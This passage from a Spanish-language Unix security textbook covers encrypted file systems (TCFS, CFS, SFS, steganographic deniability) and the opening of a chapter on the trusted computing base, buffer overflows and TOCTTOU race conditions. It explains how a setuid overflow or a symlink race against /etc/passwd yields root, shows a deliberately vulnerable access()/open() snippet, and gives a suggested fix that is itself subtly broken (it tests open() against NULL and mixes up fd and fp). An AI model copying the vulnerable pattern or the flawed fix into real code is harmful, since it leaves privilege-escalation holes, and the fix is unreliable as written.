sistema operativo, no podremos utilizar TCFS correctamente. No obstante, esta gran integraci&#x00F3;n de los
servicios de cifrado en el sistema de los &#xFB01;cheros hace que el modelo sea transparente al usuario
&#xFB01;nal.
<!--br/-->
<!--br/-->Para utilizar TCFS necesitamos que la m&#x00E1;quina que exporta directorios v&#x02CA;&#x0131;a NFS ejecute el
demonio xattrd; por su parte, los clientes han de ejecutar un n&#x00FA;cleo compilado con soporte para
TCFS. Adem&#x00E1;s, el administrador de la m&#x00E1;quina cliente ha de autorizar a los usuarios a que
utilicen TCFS, generando una clave que cada uno de ellos utilizar&#x00E1; para trabajar con los &#xFB01;cheros
cifrados; esto se consigue mediante tcfsgenkey, que genera una entrada para cada usuario en
/etc/tcfspasswd:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;tcfsgenkey
&#x00A0;login:&#x00A0;toni
&#x00A0;password:
&#x00A0;now&#x00A0;we&#x2019;ll&#x00A0;generate&#x00A0;the&#x00A0;des&#x00A0;key.
&#x00A0;press&#x00A0;10&#x00A0;keys:**********
&#x00A0;Ok.
&#x00A0;rosita:~#&#x00A0;cat&#x00A0;/etc/tcfspasswd
&#x00A0;toni:2rCmyOUsM5IA=
&#x00A0;rosita:~#
</literallayout>
<!--l. 1298--><para>Una vez que un usuario tiene una entrada en /etc/tcfspasswd con su clave ya puede acceder a &#xFB01;cheros
cifrados; para ello, en primer lugar utilizar&#x00E1; tcfslogin para insertar su clave en el kernel, tras lo cual
puede ejecutar la variante de mount distribuida con TCFS para montar los sistemas que el servidor
exporta. Sobre los archivos de estos sistemas, se utiliza la variante de chattr de TCFS para activar o
desactivar el atributo X (podemos visualizar los atributos de un &#xFB01;chero con lsattr), que indica que se
trata de archivos que necesitan al demonio de TCFS para trabajar sobre ellos (cifrando o descifrando).
Finalmente, antes de abandonar una sesi&#x00F3;n se ha de ejecutar tcfslogout, cuya funci&#x00F3;n es eliminar la
clave del kernel de Linux. Tambi&#x00E9;n es necesaria una variante de passwd, proporcionada con
TCFS, que regenera las claves de acceso a archivos cifrados cuando un usuario cambia su
password.
<!--br/-->
<!--br/-->TCFS utiliza uno de los cuatro modos de funcionamiento que ofrece el est&#x00E1;ndar DES (<citation>[?]</citation>)
denominado CBC (Cipher Block Chaining). El principal problema de este modelo (aparte de
la potencial inseguridad de DES) es la facilidad para insertar informaci&#x00F3;n al &#xFB01;nal del &#xFB01;chero
cifrado, por lo que es indispensable recurrir a estructuras que permitan detectar el &#xFB01;nal real de
cada archivo; otro problema, menos peligroso a priori, es la repetici&#x00F3;n de patrones en archivos
que ocupen m&#x00E1;s de 34 Gigabytes (aproximadamente), que puede conducir, aunque es poco
probable, a un criptoan&#x00E1;lisis exitoso en base a estas repeticiones. M&#x00E1;s peligroso es el uso del mismo
password de entrada al sistema como clave de cifrado utilizando la funci&#x00F3;n resumen MD5 (el
peligro no proviene del uso de esta funci&#x00F3;n hash, sino de la clave del usuario); previsiblemente en
futuras versiones de TCFS se utilizar&#x00E1;n passphrases similares a las de PGP para descifrar y
descifrar.
  </para></section><!--end subsection--><!--l. 1325--><section 
role="subsection"><title><abbrev role="title-mark">4.8.4</abbrev><anchor 
   id="x1-640004.8.4"  ></anchor>Otros m&#x00E9;todos de almacenamiento seguro</title>
<!--l. 1327--><para>  En los &#x00FA;ltimos a~nos los usuarios de Unix se han concienciado cada vez m&#x00E1;s con la seguridad de los datos
que poseen en sus sistemas, especialmente de la privacidad de los mismos: un sistema &#xFB01;able ha de pasar
necesariamente por un m&#x00E9;todo de almacenamiento seguro; por supuesto, esta preocupaci&#x00F3;n de los usuarios
autom&#x00E1;ticamente se traduce en m&#x00E1;s investigaciones y nuevos desarrollos en este campo de la seguridad. En
este cap&#x02CA;&#x0131;tulo hemos analizado las ventajas, las desventajas y el funcionamiento de algunos de estos
sistemas, desde el modelo cl&#x00E1;sico y habitual en Unix hasta las &#x00FA;ltimas herramientas de an&#x00E1;lisis forense y su
problem&#x00E1;tica, pasando por aplicaciones tan simples como crypt o tan complejas como PGP; aunque se ha
pretendido dar una visi&#x00F3;n general de lo que se entiende por un almacenamiento seguro en Unix, es
imposible tratar todas las implementaciones de sistemas que incrementan la seguridad en la
actualidad. No obstante, antes de &#xFB01;nalizar este cap&#x02CA;&#x0131;tulo hemos preferido comentar algunas de las
caracter&#x02CA;&#x0131;sticas de sistemas que se han hecho ya, se est&#x00E1;n haciendo, o previsiblemente se har&#x00E1;n en un
futuro no muy lejano un hueco importante entre los mecanismos de almacenamiento seguro en
Unix.
<!--br/-->
<!--br/-->No podemos &#xFB01;nalizar sin hablar del sistema CFS (Cryptographic File System), del experto
en seguridad Matt Blaze (<citation>[?]</citation>), que se ha convertido en el sistema m&#x00E1;s utilizado en entornos
donde coexisten diferentes clones de Unix (ya hemos comentado el problema de TCFS y su

dependencia con Linux). Provee de servicios de cifrado a cualquier sistema de &#xFB01;cheros habitual en
Unix, NFS incluido, utilizando una combinaci&#x00F3;n de varios modos de trabajo de DES que son lo
su&#xFB01;cientemente ligeros como para no sobrecargar demasiado a una m&#x00E1;quina normal pero lo
su&#xFB01;cientemente pesados como para proveer de un nivel aceptable de seguridad. Los usuarios no
tienen m&#x00E1;s que asociar una clave a los directorios a proteger para que CFS cifre y descifre
sus contenidos de forma transparente utilizando dicha clave; el texto en claro de los mismos
nunca se almacena en un dispositivo o se transmite a trav&#x00E9;s de la red, y los procedimientos de
copia de seguridad en la m&#x00E1;quina no se ven afectados por el uso de CFS. Todo el proceso se
realiza en el espacio de usuario (a diferencia de TCFS, que operaba dentro del kernel de Linux)
utilizando principalmente el demonio cfsd en la m&#x00E1;quina donde se encuentren los sistemas
cifrados.
<!--br/-->
<!--br/-->Peter Gutmann, del que ya hemos hablado en este cap&#x02CA;&#x0131;tulo, desarroll&#x00F3; en la primera mitad de los noventa
SFS (Secure File System). Este modelo de almacenamiento seguro se dise~n&#x00F3; originalmente para sistemas
MS-DOS o Windows, donde funciona como un manejador de dispositivos m&#x00E1;s, aunque en la actualidad
existen tambi&#x00E9;n versiones para Windows 95, Windows NT y OS/2. No est&#x00E1; portado a Unix, pero aqu&#x02CA;&#x0131; lo
citamos porque existe un sistema de almacenamiento seguro para Unix denominado tambi&#x00E9;n
Secure File System, SFS, pero no tiene nada que ver con el original de Gutmann. El SFS de
Unix funciona de una forma similar a CFS pero utilizando el criptosistema Blow&#xFB01;sh y una
versi&#x00F3;n minimalista de RSA en lugar de DES; no vamos a entrar en detalles de este software
principalmente porque su uso en entornos Unix no est&#x00E1; ni de lejos tan extendido como el de
CFS.
<!--br/-->
<!--br/-->La criptograf&#x02CA;&#x0131;a es la herramienta principal utilizada en la mayor&#x02CA;&#x0131;a de los sistemas de almacenamiento
seguro; sin embargo, todos ellos plantean un grave problema: toda su seguridad reside en la clave de
cifrado, de forma que el usuario se encuentra indefenso ante m&#x00E9;todos legales &#x2013; o ilegales &#x2013; que le puedan
obligar a desvelar esta clave una vez que se ha determinado la presencia de informaci&#x00F3;n cifrada en un
dispositivo de almacenamiento. Esto, que nos puede parecer algo exagerado, no lo es en absoluto: todos los
expertos en criptograf&#x02CA;&#x0131;a coinciden en a&#xFB01;rmar que los m&#x00E9;todos de ataque m&#x00E1;s efectivos contra un
criptosistema no son los efectuados contra el algoritmo, sino contra las personas (chantaje,
amenazas, presiones judiciales&#x2026;). Intentando dar soluci&#x00F3;n a este problema, durante los &#x00FA;ltimos
a~nos de la d&#x00E9;cada de los noventa, prestigiosos investigadores de la talla de Roger Needham,
Ross Anderson o Adi Shamir (<citation>[?]</citation>) han establecido las bases de sistemas seguros basados en
modelos esteganogr&#x00E1;&#xFB01;cos, con desarrollos especialmente importantes sobre plataformas Linux (<citation>[?]</citation>,
<citation>[?]</citation>&#x2026;). La disponibilidad del c&#x00F3;digo fuente completo de este clon de Unix unida a su pol&#x02CA;&#x0131;tica
de desarrollo ha propiciado enormemente estos avances, hasta el punto de que existen en la
actualidad sistemas de &#xFB01;cheros basados en esteganograf&#x02CA;&#x0131;a que se insertan en el kernel igual que lo
hace un sistema normal como ufs o nfs, o que se a~naden a ext2 proporcionando funciones de
cifrado.
<!--br/-->
<!--br/-->La idea es sencilla: si por ejemplo tenemos cinco archivos cifrados con una aplicaci&#x00F3;n como PGP,
cualquier atacante con acceso al dispositivo y que haga unas operaciones sobre &#xFB01;cheros puede
determinar que tenemos exactamente esos archivos cifrados; con esta informaci&#x00F3;n, su labor
para obtener la informaci&#x00F3;n est&#x00E1; muy clara: se ha de limitar a obtener las cinco claves privadas
usadas para cifrar los &#xFB01;cheros. Conocer el n&#x00FA;mero exacto es de una ayuda incalculable para el
atacante. Con los sistemas esteganogr&#x00E1;&#xFB01;cos, a pesar de que es imposible ocultar la existencia de
cierta informaci&#x00F3;n cifrada, alguien que la inspeccione no va a poder determinar si la clave de
descifrado que el propietario le ha proporcionado otorga acceso a toda la informaci&#x00F3;n o s&#x00F3;lo a una
parte de la misma. Un atacante que no posea todas las claves no va a poder descifrar todos
los &#xFB01;cheros, y lo m&#x00E1;s importante: no va a poder saber ni siquiera si otros archivos aparte de
aquellos a los que ha accedido existen o no, aunque posea un acceso total al software y al
soporte f&#x02CA;&#x0131;sico. Para conseguir esto se utiliza una propiedad de ciertos mecanismos de seguridad
denominada plausible deniability, algo que se vendr&#x02CA;&#x0131;a a traducir como &#x2018;negaci&#x00F3;n creible&#x2019;; dicha
propiedad permitir&#x02CA;&#x0131;a a un usuario negar de forma creible que en un dispositivo exista m&#x00E1;s
informaci&#x00F3;n cifrada de la que ya se ha podido descubrir, o que cierta transacci&#x00F3;n se haya llevado a
cabo. Volviendo al ejemplo de PGP, el usuario podr&#x02CA;&#x0131;a revelar la clave de cifrado de s&#x00F3;lo uno o
dos de los archivos, aquellos que no considere vitales, ocultando las claves y la existencia del

resto sin que el atacante sea capaz de determinar que la informaci&#x00F3;n accedida no es toda la
existente.



</para><!--l. 1--><para>

  </para></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-650005"  ></anchor>Programas seguros, inseguros y nocivos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">5.1</abbrev><anchor 
   id="x1-660005.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  En 1990 Barton P. Miller y un grupo de investigadores publicaron <citation>[?]</citation>, un art&#x02CA;&#x0131;culo en el que se mostraba
que demasiadas herramientas est&#x00E1;ndar (m&#x00E1;s del 25 %) de Unix fallaban ante elementos tan simples como una
entrada anormal. Cinco a~nos m&#x00E1;s tarde otro grupo de investigaci&#x00F3;n, dirigido tambi&#x00E9;n por Barton P. Miller,
realiz&#x00F3; el estudio <citation>[?]</citation>, lamentablemente no publicado; las conclusiones en este &#x00FA;ltimo estudio
fueron sorprendentes: el sistema con las herramientas m&#x00E1;s estables era Slackware Linux, un
Unix gratuito y de c&#x00F3;digo fuente libre que presentaba una tasa de fallos muy inferior al de
sistemas comerciales como Solaris o IRIX. Aparte de este hecho anecd&#x00F3;tico, era preocupante
comprobar como la mayor&#x02CA;&#x0131;a de problemas descubiertos en 1990 segu&#x02CA;&#x0131;a presente en los sistemas Unix
estudiados.
<!--br/-->
<!--br/-->Aunque por fortuna la calidad del software ha mejorado mucho en los &#x00FA;ltimos
a~nos <anchor 
   id="x1-66001f1"  ></anchor><footnote><para>     En Unix, claro.</para></footnote>, y
esa mejora lleva asociada una mejora en la robustez del c&#x00F3;digo, los fallos y errores de dise~no en aplicaciones
o en el propio n&#x00FA;cleo son una de las fuentes de amenazas a la seguridad de todo sistema inform&#x00E1;tico. Pero no
s&#x00F3;lo los errores son problem&#x00E1;ticos, sino que existen programas &#x2013; como los virus &#x2013; realizados en la mayor&#x02CA;&#x0131;a de
situaciones no para realizar tareas &#x00FA;tiles sino para comprometer la seguridad de una m&#x00E1;quina o de toda una
red. Este tipo de programas s&#x00F3;lamente compromete la seguridad cuando afectan al administrador; si un
virus infecta &#xFB01;cheros de un usuario, o si &#x00E9;ste ejecuta un troyano, s&#x00F3;lo podr&#x00E1; perjudicarse a s&#x02CA;&#x0131; mismo: podr&#x00E1;
borrar sus &#xFB01;cheros, enviar correo en su nombre o matar sus procesos, pero no hacer lo mismo
con el resto de usuarios o el root. El problema para la seguridad viene cuando es el propio
administrador quien utiliza programas contaminados por cualquier clase de fauna, y para evitar
esto hay una medida de protecci&#x00F3;n b&#x00E1;sica: la prevenci&#x00F3;n. Es crucial que las actividades como
administrador se reduzcan al m&#x02CA;&#x0131;nimo, ejecutando como usuario normal las tareas que no requieran de
privilegios. Cuando no quede m&#x00E1;s remedio que trabajar como root (por ejemplo a la hora de instalar
software en el sistema), no hemos de ejecutar nada que no provenga de una fuente &#xFB01;able, e
incluso as&#x02CA;&#x0131; tomar precauciones en caso de que el programa realice funciones m&#x02CA;&#x0131;nimamente
delicadas para el sistema operativo (por ejemplo, probarlo antes en una m&#x00E1;quina de testeo, o en
entornos cerrados con chroot()). Es muy normal, sobre todo entre administradores de Linux, el
recomendar que no se ejecute nada sin haber le&#x02CA;&#x0131;do previamente el c&#x00F3;digo fuente, o al menos que dicho
c&#x00F3;digo est&#x00E9; disponible; esto, aunque es una soluci&#x00F3;n perfecta al problema, es inaplicable en la
mayor&#x02CA;&#x0131;a de situaciones. Por un lado, no todas las aplicaciones o sistemas tienen su c&#x00F3;digo abierto
a sus usuarios, por lo que nos estar&#x02CA;&#x0131;amos restringiendo a utilizar programas generalmente
no comerciales &#x2013; algo que quiz&#x00E1;s no depende de nosotros, como administradores &#x2013;. Por otro,
resulta absurdo pensar que un administrador tenga el tiempo necesario para leer (y lo m&#x00E1;s
importante, para comprobar) cada l&#x02CA;&#x0131;nea del c&#x00F3;digo de todos los programas instalados en sus
m&#x00E1;quinas.
  </para></section><!--end section--><!--l. 50--><section 
role="section"><title><abbrev role="title-mark">5.2</abbrev><anchor 
   id="x1-670005.2"  ></anchor>La base &#xFB01;able de c&#x00F3;mputo</title>
<!--l. 51--><para>  La base &#xFB01;able (o segura) de c&#x00F3;mputo (Trusted Computing Base, TCB) es una caracter&#x02CA;&#x0131;stica de ciertos
Unices que incrementa la seguridad del sistema marcando ciertos elementos del mismo como &#x2018;seguros&#x2019;.
Aunque estos elementos son b&#x00E1;sicamente el hardware y ciertos &#xFB01;cheros, la parte software es mucho m&#x00E1;s
importante para el administrador que la m&#x00E1;quina f&#x02CA;&#x0131;sica, por lo que aqu&#x02CA;&#x0131; hablaremos principalmente de ella.
Los &#xFB01;cheros pertenecientes a la base segura de c&#x00F3;mputo, y la TCB en su conjunto, tratan de asegurar al
administrador que est&#x00E1; ejecutando el programa que desea y no otro que un intruso haya podido
poner en su lugar (conteniendo, por ejemplo, un troyano). La TCB implementa la pol&#x02CA;&#x0131;tica de
seguridad del sistema inspeccionando y vigilando las interacciones entre entidades (procesos) y
objetos (principalmente &#xFB01;cheros); dicha pol&#x02CA;&#x0131;tica suele consistir en un control de accesos y
en la reutilizaci&#x00F3;n de objetos (c&#x00F3;mo debe inicializarse o desinstalarse un objeto antes de ser
reasignado).
<!--br/-->
<!--br/-->Los &#xFB01;cheros con la marca de seguridad activada son generalmente el propio n&#x00FA;cleo del sistema operativo y
archivos que mantienen datos relevantes para la seguridad, contenidos en ciertos directorios como /tcb/ o

/etc/auth/; cualquier &#xFB01;chero nuevo o que pertenezca a la TCB pero que haya sido modi&#xFB01;cado
autom&#x00E1;ticamente tiene su marca desactivada. Puede ser activada o reactivada por el administrador (por
ejemplo, en AIX con la orden tcbck -a), aunque en algunos sistemas para que un archivo pertenezca a la
TCB tiene que haber sido creado con programas que ya pertenec&#x02CA;&#x0131;an a la TCB. Con este mecanismo se
trata de asegurar que nadie, y especialmente el root, va a ejecutar por accidente c&#x00F3;digo peligroso: si el
administrador ha de ejecutar tareas sensibles de cara a la seguridad, puede arrancar un int&#x00E9;rprete de
comandos seguro (perteneciente a la TCB) que s&#x00F3;lo le permitir&#x00E1; ejecutar programas que est&#x00E9;n en la
base.
<!--br/-->
<!--br/-->La comunicaci&#x00F3;n entre la base &#xFB01;able de c&#x00F3;mputo y el usuario se ha de realizar a trav&#x00E9;s de lo que se denomina
la ruta de comunicaci&#x00F3;n &#xFB01;able (Trusted Communication Path, TCP), ruta que se ha de invocar
mediante una combinaci&#x00F3;n de teclas (por ejemplo, Ctrl-X Ctrl-R en AIX) denominada SAK (Secure
Attention Key) siempre que el usuario deba introducir datos que no deban ser comprometidos, como una
clave. Tras invocar a la ruta de comunicaci&#x00F3;n &#xFB01;able mediante la combinaci&#x00F3;n de teclas correspondiente
el sistema operativo se ha de asegurar de que los programas no &#xFB01;ables (los no incluidos en
la TCB) no puedan acceder a la terminal desde la que se ha introducido el SAK; una vez
conseguido esto &#x2013; generalmente a partir de init &#x2013; se solicitar&#x00E1; al usuario en la terminal su login y su
password, y si ambos son correctos se lanzar&#x00E1; un shell &#xFB01;able (tsh), que s&#x00F3;lo ejecutar&#x00E1; programas
miembros de la TCB (algo que es muy &#x00FA;til por ejemplo para establecer un entorno seguro para la
administraci&#x00F3;n del sistema, si el usuario es el root). Desde el punto de vista del usuario, tras
pulsar el SAK lo &#x00FA;nico que aparecer&#x00E1; ser&#x00E1; un prompt solicitando el login y la clave; si en lugar de
esto aparece el s&#x02CA;&#x0131;mbolo de tsh, signi&#xFB01;ca que alguien ha intentado robar nuestra contrase~na:
deberemos averiguar qui&#x00E9;n est&#x00E1; haciendo uso de esa terminal (por ejemplo mediante who) y
noti&#xFB01;carlo al administrador &#x2013; o tomar las medidas oportunas si ese administrador somos nosotros
&#x2013;.
<!--br/-->
<!--br/-->A pesar de la utilidad de la TCB, es recomendable recordar que un &#xFB01;chero incluido en ella, con la
marca activada, no siempre es garant&#x02CA;&#x0131;a de seguridad; como todos los mecanismos existentes, la
base &#xFB01;able de c&#x00F3;mputo est&#x00E1; pensada para utilizarse junto a otros mecanismos, y no en lugar de
ellos.
  </para></section><!--end section--><!--l. 106--><section 
role="section"><title><abbrev role="title-mark">5.3</abbrev><anchor 
   id="x1-680005.3"  ></anchor>Errores en los programas</title>
<!--l. 108--><para>  Los errores o bugs a la hora de programar c&#x00F3;digo de aplicaciones o del propio n&#x00FA;cleo de Unix constituyen
una de las amenazas a la seguridad que m&#x00E1;s quebraderos de cabeza proporciona a la comunidad de la
seguridad inform&#x00E1;tica. En la mayor&#x02CA;&#x0131;a de situaciones no se trata de desconocimiento a la hora de realizar
programas seguros, sino del hecho que es pr&#x00E1;cticamente imposible no equivocarse en miles de l&#x02CA;&#x0131;neas de
c&#x00F3;digo: simplemente el n&#x00FA;cleo de Minix, un mini-Unix dise~nado por Andrew Tanenbaum (<citation>[?]</citation>) con &#xFB01;nes
docentes, tiene m&#x00E1;s de 13000 l&#x02CA;&#x0131;neas de c&#x00F3;digo en su versi&#x00F3;n 1.0.
<!--br/-->
<!--br/-->Cuando un error sucede en un programa que se ejecuta en modo usuario el &#x00FA;nico problema que suele causar
es la inconveniencia para quien lo estaba utilizando. Por ejemplo, imaginemos un acceso no autorizado a
memoria por parte de cierta aplicaci&#x00F3;n; el sistema operativo detectar&#x00E1; que se intenta violar la seguridad del
sistema y &#xFB01;nalizar&#x00E1; el programa envi&#x00E1;ndole la se~nal SIGSEGV. Pero si ese mismo error sucede en un programa
que corre con privilegios de root &#x2013; por ejemplo, un ejecutable setuidado &#x2013;, un atacante puede
aprovechar el fallo para ejecutar c&#x00F3;digo malicioso que el programa a priori no deb&#x02CA;&#x0131;a ejecutar. Y si un
error similar se produce en el c&#x00F3;digo del kernel del sistema operativo, las consecuencias son
incluso peores: se podr&#x02CA;&#x0131;a llegar a producir un Kernel Panic o, dicho de otra forma, la parada
s&#x00FA;bita de la m&#x00E1;quina en la mayor&#x02CA;&#x0131;a de situaciones; el error m&#x00E1;s grave que se puede generar en
Unix.
  </para><!--l. 130--><section 
role="subsection"><title><abbrev role="title-mark">5.3.1</abbrev><anchor 
   id="x1-690005.3.1"  ></anchor>Bu&#xFB00;er over&#xFB02;ows</title>
<!--l. 131--><para>  Seguramente uno de los errores m&#x00E1;s comunes, y sin duda el m&#x00E1;s conocido y
utilizado es el stack smashing o desbordamiento de pila, tambi&#x00E9;n conocido por bu&#xFB00;er

over&#xFB02;ow <anchor 
   id="x1-69001f2"  ></anchor><footnote><para>    Realmente el stack smashing es un caso particular del bu&#xFB00;er over&#xFB02;ow, aunque al ser el m&#x00E1;s habitual se suelen confundir
ambos t&#x00E9;rminos (<citation>[?]</citation>).</para></footnote>;
aunque el gusano de Robert T. Morris (1988) ya lo utilizaba, no fu&#x00E9; hasta 1997 cuando este fallo se hizo
realmente popular a ra&#x02CA;&#x0131;z de <citation>[?]</citation>. A pesar de que alguien pueda pensar que en todo el tiempo trascurrido
hasta hoy en d&#x02CA;&#x0131;a los problemas de bu&#xFB00;er over&#xFB02;ow estar&#x00E1;n solucionados, o al menos controlados, a&#x00FA;n se ven
con frecuencia alertas sobre programas que se ven afectados por desbordamientos (justamente hoy, 28 de
febrero del 2000, han llegado a la lista BUGTRAQ un par de programas que aprovechaban estos errores para
aumentar el nivel de privilegio de un usuario en el sistema). Aunque cada vez los programas son m&#x00E1;s
seguros, especialmente los setuidados, es casi seguro que un potencial atacante que acceda a nuestro
sistema va a intentar &#x2013; si no lo ha hecho ya &#x2013; conseguir privilegios de administrador a trav&#x00E9;s de un bu&#xFB00;er
over&#xFB02;ow.
<!--br/-->
<!--br/-->La idea del stack smashing es sencilla: en algunas implementaciones de C es posible corromper la pila de
ejecuci&#x00F3;n de un programa escribiendo m&#x00E1;s all&#x00E1; de los l&#x02CA;&#x0131;mites de un array declarado auto en una funci&#x00F3;n; esto
puede causar que la direcci&#x00F3;n de retorno de dicha funci&#x00F3;n sea una direcci&#x00F3;n aleatoria. Esto, unido a
permisos de los &#xFB01;cheros ejecutables en Unix (principalmente a los bits de SetUID y SetGID), hace
que el sistema operativo pueda otorgar acceso root a usuarios sin privilegios. Por ejemplo,
imaginemos una funci&#x00F3;n que trate de copiar con strcpy() un array de 200 caracteres en uno de
20: al ejecutar el programa, se generar&#x00E1; una violaci&#x00F3;n de segmento (y por tanto el cl&#x00E1;sico core
dump al que los usuarios de Unix estamos acostumbrados). Se ha producido una sobreescritura
de la direcci&#x00F3;n de retorno de la funci&#x00F3;n; si logramos que esta sobreescritura no sea aleatoria
sino que apunte a un c&#x00F3;digo concreto (habitualmente el c&#x00F3;digo de un shell), dicho c&#x00F3;digo se va a
ejecutar.
<!--br/-->
<!--br/-->&#x00BF;Cu&#x00E1;l es el problema? El problema reside en los &#xFB01;cheros setuidados y setgidados; recordemos que cuando
alguien los ejecuta, est&#x00E1; trabajando con los privilegios de quien los cre&#x00F3;, y todo lo que ejecute lo hace
con esos privilegios&#x2026;incluido el c&#x00F3;digo que se ha insertado en la direcci&#x00F3;n de retorno de nuestra
funci&#x00F3;n problem&#x00E1;tica. Si como hemos dicho, este c&#x00F3;digo es el de un int&#x00E9;rprete de comandos y el
&#xFB01;chero pertenece al administrador, el atacante consigue ejecutar un shell con privilegios de
root.
<!--br/-->
<!--br/-->Existen multitud de exploits (programas que aprovechan un error en otro programa para violar la pol&#x02CA;&#x0131;tica
de seguridad del sistema) disponibles en Internet, para casi todas las variantes de Unix y que incluyen el
c&#x00F3;digo necesario para ejecutar shells sobre cualquier operativo y arquitectura. Para minimizar el
impacto que los desbordamientos pueden causar en nuestro sistema es necesaria una colaboraci&#x00F3;n
entre fabricantes, administradores y programadores (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;). Los primeros han de tratar
de veri&#xFB01;car m&#x00E1;s la robustez de los programas cr&#x02CA;&#x0131;ticos antes de distribuirlos, mientras que los
administradores han de mantener al m&#x02CA;&#x0131;nimo el n&#x00FA;mero de &#xFB01;cheros setuidados o setgidados en sus
sistemas y los programadores tienen que esforzarse en generar c&#x00F3;digo con menos puntos de
desbordamiento; en <citation>[?]</citation> se pueden encontrar algunas l&#x02CA;&#x0131;neas a tener en cuenta en la prevenci&#x00F3;n de bu&#xFB00;er
over&#xFB02;ows.
  </para></section><!--end subsection--><!--l. 183--><section 
role="subsection"><title><abbrev role="title-mark">5.3.2</abbrev><anchor 
   id="x1-700005.3.2"  ></anchor>Condiciones de carrera</title>
<!--l. 184--><para>  Otro error muy conocido en el mundo de los sistemas operativos son las condiciones de carrera,
situaciones en las que dos o m&#x00E1;s procesos leen o escriben en un &#x00E1;rea compartida y el resultado &#xFB01;nal depende
de los instantes de ejecuci&#x00F3;n de cada uno (<citation>[?]</citation>). Cuando una situaci&#x00F3;n de este tipo se produce y acciones que
deber&#x02CA;&#x0131;an ser at&#x00F3;micas no lo son, existe un intervalo de tiempo durante el que un atacante puede obtener
privilegios, leer y escribir &#xFB01;cheros protegidos, y en de&#xFB01;nitiva violar las pol&#x02CA;&#x0131;ticas de seguridad del sistema
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Por ejemplo, imaginemos un programa setuidado perteneciente a root que almacene informaci&#x00F3;n en un
&#xFB01;chero propiedad del usuario que est&#x00E1; ejecutando el programa; seguramente el c&#x00F3;digo contendr&#x00E1; unas l&#x02CA;&#x0131;neas
similares a las siguientes (no se ha incluido la comprobaci&#x00F3;n b&#x00E1;sica de errores por motivos de
claridad):

     </para><literallayout role="verbatim">
&#x00A0;if(access(fichero,&#x00A0;W&#x005F;OK)==0){
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;open();
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;write();
&#x00A0;}
</literallayout>
<!--l. 205--><para>En una ejecuci&#x00F3;n normal, si el usuario no tiene privilegios su&#xFB01;cientes para escribir en el &#xFB01;chero, la llamada a
access() devolver&#x00E1; -1 y no se permitir&#x00E1; la escritura. Si esta llamada no falla open() tampoco lo har&#x00E1;, ya que
el UID efectivo con que se est&#x00E1; ejecutando el programa es el del root; as&#x02CA;&#x0131; nos estamos asegurando que el
programa escriba en el &#xFB01;chero si y s&#x00F3;lo si el usuario que lo ejecuta puede hacerlo &#x2013; sin privilegios
adicionales por el setuid &#x2013;. Pero, &#x00BF;qu&#x00E9; sucede si el &#xFB01;chero cambia entre la llamada a access() y las
siguientes? El programa estar&#x00E1; escribiendo en un archivo sobre el que no se han realizado las
comprobaciones necesarias para garantizar la seguridad. Por ejemplo, imaginemos que tras la llamada a
access(), y justo antes de que se ejecute open(), el usuario borra el &#xFB01;chero referenciado y enlaza
/etc/passwd con el mismo nombre: el programa estar&#x00E1; escribiendo informaci&#x00F3;n en el &#xFB01;chero de
contrase~nas.
<!--br/-->
<!--br/-->Este tipo de situaci&#x00F3;n, en la que un programa comprueba una propiedad de un objeto y luego ejecuta
determinada acci&#x00F3;n asumiendo que la propiedad se mantiene, cuando realmente no es as&#x02CA;&#x0131;, se denomina
TOCTTOU (Time of check to time of use). &#x00BF;Qu&#x00E9; se puede hacer para evitarla? El propio sistema operativo
nos da las diferentes soluciones al problema (<citation>[?]</citation>). Por ejemplo, podemos utilizar descriptores de &#xFB01;chero en
lugar de nombres: en nuestro caso, deber&#x02CA;&#x0131;amos utilizar una variante de la llamada access() que
trabaje con descriptores en lugar de nombres de archivo (no es algo que exista realmente, ser&#x02CA;&#x0131;a
necesario modi&#xFB01;car el n&#x00FA;cleo del operativo para conseguirlo); con esto conseguimos que aunque se
modi&#xFB01;que el nombre del &#xFB01;chero, el objeto al que accedemos sea el mismo durante todo el
tiempo. Adem&#x00E1;s, es conveniente invertir el orden de las llamadas (invocar primero a open()
y despu&#x00E9;s a nuestra variante de access()); de esta forma, el c&#x00F3;digo anterior quedar&#x02CA;&#x0131;a como
sigue:

     </para><literallayout role="verbatim">
&#x00A0;if((fd=open(fichero,&#x00A0;O&#x005F;WRONLY))==NULL){
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;(access2(fileno(fp),W&#x005F;OK)==0){
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;write();
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;}
&#x00A0;}
</literallayout>
<!--l. 242--><para>No obstante, existen llamadas que utilizan nombres de &#xFB01;chero y no tienen un equivalente que utilice
descriptores; para no tener que reprogramar todo el n&#x00FA;cleo de Unix, existe una segunda soluci&#x00F3;n que cubre
tambi&#x00E9;n a estas llamadas: asociar un descriptor y un nombre de &#xFB01;chero sin restringir el modo de acceso.
Para esto se utilizar&#x02CA;&#x0131;a un modo especial de apertura, O<informalequation><graphic 
fileref="unixsec45x.gif"></graphic></informalequation>ACCESS &#x2013; que ser&#x02CA;&#x0131;a necesario implementar &#x2013;, en
lugar de los cl&#x00E1;sicos O<informalequation><graphic 
fileref="unixsec46x.gif"></graphic></informalequation>RDONLY, O<informalequation><graphic 
fileref="unixsec47x.gif"></graphic></informalequation>WRONLY o O<informalequation><graphic 
fileref="unixsec48x.gif"></graphic></informalequation>RDWR; este nuevo modo garantizar&#x02CA;&#x0131;a que si el objeto existe se
har&#x02CA;&#x0131;a sobre &#x00E9;l un open() habitual pero sin derecho de escritura o lectura (ser&#x02CA;&#x0131;a necesario efectuar
una segunda llamada a la funci&#x00F3;n, con los par&#x00E1;metros adecuados), y si no existe se reserva un
nombre y un inodo de tipo &#x2018;reservado&#x2019;, un tipo de transici&#x00F3;n que posteriormente ser&#x02CA;&#x0131;a necesario
